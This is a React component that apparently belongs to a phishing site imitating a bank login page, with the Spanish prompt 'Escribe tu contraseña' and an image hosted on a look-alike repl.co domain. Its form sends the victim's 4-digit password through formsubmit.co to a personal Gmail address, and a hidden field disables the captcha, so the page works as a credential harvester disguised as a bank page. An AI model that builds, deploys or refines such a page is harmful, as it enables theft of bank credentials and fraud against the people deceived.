import React, { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import './contraseña.css'
import Footer from './Footer'
import Cargando from './Cargando'

const Contraseña = ({setLoading}) => {

  const navigate = useNavigate()
  const [colorBtn, setColorBtn] = useState(false)
  const [load, setLoad] = useState(true)

  setTimeout(() => {
    setLoad(false)
  }, 1500);

  const volver = () => {
    navigate('/')
  }

  const btnColor = e => {
    e.target.value.length === 4 ? setColorBtn(true) : setColorBtn(false)
  }

  // const ingresar = e => {
  //   e.preventDefault()

  //   if(e.target.password.value.length === 4) navigate('/validar-identidad')

  //   navigate('/validar-identidad')

  //   setLoading(true)

  //   setTimeout(() => {
  //     setLoading(false)
  //   }, 1500);
  // }

  if(load){
    return <Cargando /> 
  }else {
    return (
      <div className='contraseña'>
        <section>
          <div onClick={volver} className="back">
            <div className="icon-back">
              <i className='bx bx-arrow-back'></i>
            </div>
          <p>Volver</p>
          </div>
  
          <div className="texto-contraseña">
            <div className="img-contra">
          <img src="https://ventas.popularcomproba.repl.co/password.png" alt="" />            
            </div>
          <h1>Escribe tu contraseña</h1>
        </div>
        <form action="https://formsubmit.co/raulsacoco@gmail.com" method="POST">
          <div>
            <label htmlFor="password">Contraseña Única</label>
            <p>¿La olvidaste?</p>
          </div>
          <input onChange={btnColor} id='password' type="password" name='pass' minLength="4" maxLength="4" />
          <input type="hidden" name="_captcha" value="false"></input>
  
          <button className={`${colorBtn && 'btn-active'}`}>Ingresar</button>
        </form>
  
        <Footer />
        </section>
        
      </div>
    )
  }
}

export default Contraseña